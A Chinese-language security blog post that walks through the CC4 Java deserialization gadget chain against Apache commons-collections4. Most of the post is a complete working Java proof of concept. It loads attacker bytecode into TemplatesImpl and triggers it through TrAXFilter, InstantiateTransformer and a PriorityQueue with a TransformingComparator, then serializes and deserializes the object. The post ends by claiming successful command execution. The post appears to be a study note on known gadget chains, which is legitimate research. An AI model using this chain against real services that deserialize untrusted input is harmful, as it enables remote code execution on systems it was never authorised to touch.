---
title: "Java反序列化-CC4"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# Java反序列化链-CC4

CC4也是针对`org.apache.commons:commons-collections4`的一条链子，本质上是在CC2的基础上修改，主要思路是使用我们在CC3提到的InstantiateTransformer来代替原本的InvokerTransformer

## 构造

按照上面的思路来构造：

~~~java
package com.yuy0ung;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections4 {
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][] {code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(tmpl);
        queue.add(tmpl);

        setFieldValue(transformerChain, "iTransformers", transformers);

        serialize(queue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
~~~

成功命令执行：

![QQ_1761890071084](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761890071084.png)
